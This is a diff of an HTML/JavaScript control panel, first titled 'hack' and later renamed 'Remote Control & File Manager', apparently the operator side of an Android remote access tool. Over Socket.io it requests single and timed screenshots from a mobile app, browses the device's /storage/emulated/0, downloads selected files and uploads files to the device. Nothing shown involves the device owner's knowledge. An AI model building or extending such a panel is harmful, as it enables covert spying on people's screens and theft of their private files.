@@ -1,101 +1,206 @@
 <!DOCTYPE html>
-<html lang="ur" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>hack</title>
+    <title>Remote Control & File Manager</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
-        .panel-container { background: #fff; max-width: 600px; margin: 0 auto; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .control-group { margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #ddd; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 5px; margin: 5px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f5; margin: 0; padding: 20px; display: flex; gap: 20px; }
+        .panel { background: #fff; flex: 1; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); height: 90vh; overflow-y: auto; }
+        h3 { margin-top: 0; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
+        
+        /* Screen Capture Styles */
+        .control-group { margin-bottom: 15px; }
+        button { padding: 8px 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 4px; font-weight: bold; }
         button:hover { background: #0056b3; }
-        button.danger { background: #dc3545; }
-        button.danger:hover { background: #c82333; }
-        input[type="number"] { padding: 10px; font-size: 16px; width: 100px; text-align: center; border-radius: 5px; border: 1px solid #ccc; }
-        #imageGallery { margin-top: 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; }
-        #imageGallery img { max-width: 100%; border: 3px solid #333; border-radius: 8px; }
+        button.success { background: #28a745; } button.success:hover { background: #1e7e34; }
+        button.danger { background: #dc3545; } button.danger:hover { background: #c82333; }
+        input[type="number"], input[type="file"] { padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
+        #imageGallery img { max-width: 100%; border-radius: 5px; margin-top: 10px; border: 2px solid #333; }
+
+        /* File Manager Styles */
+        .fm-header { display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 15px; }
+        .fm-path { font-family: monospace; font-size: 14px; word-break: break-all; }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th, td { padding: 10px; border-bottom: 1px solid #eee; }
+        th { background: #f1f1f1; }
+        tr:hover { background: #f9f9f9; }
+        .icon { font-size: 20px; margin-right: 10px; cursor: pointer; }
+        .file-name { cursor: pointer; user-select: none; }
+        .file-name:hover { color: #007bff; text-decoration: underline; }
     </style>
 </head>
 <body>
 
-    <div class="panel-container">
-        <h2>hack</h2>
-        
+    <div class="panel">
+        <h3>Screen Monitor</h3>
         <div class="control-group">
-            <button onclick="getSingleCapture()">Get Capture (Single)</button>
+            <button onclick="socket.emit('request_single_shot')">Capture Now</button>
+            <button class="danger" onclick="document.getElementById('imageGallery').innerHTML=''">Clear</button>
         </div>
-
         <div class="control-group">
-            <input type="number" id="timeMinutes" placeholder="Minutes" min="1">
-            <button onclick="startTimerCapture()">Start Capture (Timer)</button>
+            <input type="number" id="timerMins" value="1" min="1" style="width: 60px;"> Mins
+            <button class="success" onclick="startStream()">Start Stream</button>
         </div>
-
-        <div>
-            <button class="danger" onclick="clearScreen()">Clear Screen</button>
-        </div>
+        <div id="imageGallery"></div>
     </div>
 
-    <div id="imageGallery"></div>
+    <div class="panel">
+        <h3>File Manager</h3>
+        
+        <div class="fm-header">
+            <div class="fm-path" id="currentPathDisplay">/storage/emulated/0</div>
+            <div>
+                <button class="success" onclick="downloadSelected()">⬇ Download Selected</button>
+            </div>
+        </div>
+
+        <div class="fm-header" style="background: #e9ecef;">
+            <input type="file" id="fileUploadInput">
+            <button onclick="uploadFile()">⬆ Upload Here</button>
+            <button onclick="loadDirectory(currentPath)">↻ Refresh</button>
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 40px;"><input type="checkbox" id="selectAll" onclick="toggleAll()"></th>
+                    <th>Name</th>
+                    <th>Size</th>
+                </tr>
+            </thead>
+            <tbody id="fileTableBody">
+                </tbody>
+        </table>
+    </div>
 
     <script>
         const socket = io();
-        const imageGallery = document.getElementById('imageGallery');
+        let currentPath = "/storage/emulated/0";
 
-        // پیج ریلوڈ ہونے پر پرانی تصویریں واپس لانا
-        window.onload = () => {
-            const savedImages = JSON.parse(localStorage.getItem('savedCaptures')) || [];
-            savedImages.forEach(src => addImageToUI(src));
-        };
-
-        // سنگل کیپچر کی کمانڈ بھیجنا
-        function getSingleCapture() {
-            socket.emit('request_single_shot');
+        // --- Screen Capture Logic ---
+        function startStream() {
+            const mins = document.getElementById('timerMins').value;
+            socket.emit('request_timer_stream', { durationMinutes: parseInt(mins) });
         }
-
-        // ٹائمر کی کمانڈ بھیجنا
-        function startTimerCapture() {
-            const minutes = document.getElementById('timeMinutes').value;
-            if(!minutes || minutes <= 0) {
-                alert('Please Enter Time!');
-                return;
-            }
-            socket.emit('request_timer_stream', { durationMinutes: parseInt(minutes) });
-        }
-
-        // سکرین اور لوکل سٹوریج دونوں کو کلیئر کرنا
-        function clearScreen() {
-            imageGallery.innerHTML = '';
-            localStorage.removeItem('savedCaptures');
-        }
-
-        // تصویر کو سکرین پر شو کروانا (نئی تصویر سب سے اوپر آئے گی)
-        function addImageToUI(src) {
-            const img = document.createElement('img');
-            img.src = src;
-            imageGallery.prepend(img);
-        }
-
-        // تصویر کو لوکل سٹوریج میں محفوظ کرنا
-        function saveToLocalStorage(src) {
-            let savedImages = JSON.parse(localStorage.getItem('savedCaptures')) || [];
-            savedImages.unshift(src); // نئی تصویر کو شروع میں ڈالیں
-            
-            // صرف آخری 10 تصویریں رکھیں تاکہ میموری فل نہ ہو
-            if(savedImages.length > 10) {
-                savedImages.pop();
-            }
-            localStorage.setItem('savedCaptures', JSON.stringify(savedImages));
-        }
-
-        // موبائل ایپ سے جب تصویر آئے گی تو یہ فنکشن چلے گا
         socket.on('receive_screenshot', (data) => {
             if(data && data.image) {
-                addImageToUI(data.image);
-                saveToLocalStorage(data.image);
+                const img = document.createElement('img');
+                img.src = data.image;
+                const gallery = document.getElementById('imageGallery');
+                gallery.prepend(img);
+                if(gallery.children.length > 5) gallery.lastChild.remove();
             }
         });
+
+        // --- File Manager Logic ---
+        
+        // Initial load
+        window.onload = () => loadDirectory(currentPath);
+
+        function loadDirectory(path) {
+            currentPath = path;
+            document.getElementById('currentPathDisplay').innerText = currentPath;
+            document.getElementById('fileTableBody').innerHTML = '<tr><td colspan="3">Loading...</td></tr>';
+            socket.emit('request_directory', currentPath);
+        }
+
+        socket.on('receive_directory_list', (data) => {
+            const tbody = document.getElementById('fileTableBody');
+            tbody.innerHTML = '';
+            
+            // Add "Go Back" row if not in root
+            if (currentPath !== "/storage/emulated/0" && currentPath.length > 1) {
+                const parentPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td></td>
+                    <td colspan="2" class="file-name" onclick="loadDirectory('${parentPath || '/'}')">
+                        <span class="icon">🔙</span> .. (Go Up)
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            }
+
+            if (data.error) {
+                tbody.innerHTML = `<tr><td colspan="3" style="color:red;">Error: ${data.error}</td></tr>`;
+                return;
+            }
+
+            data.files.forEach(file => {
+                const tr = document.createElement('tr');
+                let icon = '📄';
+                if (file.isDirectory) icon = '📁';
+                else if (file.name.match(/\.(jpg|jpeg|png|gif)$/i)) icon = '🖼️';
+                else if (file.name.match(/\.(mp4|mkv|avi)$/i)) icon = '🎥';
+                else if (file.name.match(/\.(mp3|wav|m4a)$/i)) icon = '🎵';
+                else if (file.name.match(/\.(apk)$/i)) icon = '📦';
+
+                const sizeText = file.isDirectory ? '--' : (file.size / 1024 / 1024).toFixed(2) + ' MB';
+                
+                tr.innerHTML = `
+                    <td>${!file.isDirectory ? `<input type="checkbox" class="file-checkbox" value="${file.path}" data-name="${file.name}">` : ''}</td>
+                    <td class="file-name" onclick="${file.isDirectory ? `loadDirectory('${file.path.replace(/\\/g, '\\\\')}')` : ''}">
+                        <span class="icon">${icon}</span> ${file.name}
+                    </td>
+                    <td>${sizeText}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        });
+
+        function toggleAll() {
+            const isChecked = document.getElementById('selectAll').checked;
+            document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = isChecked);
+        }
+
+        // --- File Download Logic ---
+        function downloadSelected() {
+            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
+            if (checkboxes.length === 0) { alert('Select at least one file to download.'); return; }
+            
+            checkboxes.forEach(cb => {
+                const filePath = cb.value;
+                socket.emit('request_download_file', filePath);
+            });
+            document.getElementById('selectAll').checked = false;
+            toggleAll();
+        }
+
+        // Handle incoming downloaded file
+        socket.on('receive_file_data', (data) => {
+            if(data.error) { alert('Download failed: ' + data.error); return; }
+            
+            // Create a temporary link to download the base64 data
+            const a = document.createElement("a");
+            a.href = data.fileData; // base64 string
+            a.download = data.fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+
+        // --- File Upload Logic ---
+        function uploadFile() {
+            const fileInput = document.getElementById('fileUploadInput');
+            const file = fileInput.files[0];
+            if (!file) { alert('Select a file to upload first!'); return; }
+
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                const base64Data = event.target.result;
+                socket.emit('request_upload_file', {
+                    targetDirectory: currentPath,
+                    fileName: file.name,
+                    fileData: base64Data
+                });
+                alert('Uploading ' + file.name + '...');
+                fileInput.value = ''; 
+            };
+            reader.readAsDataURL(file);
+        }
+
     </script>
 </body>
 </html>
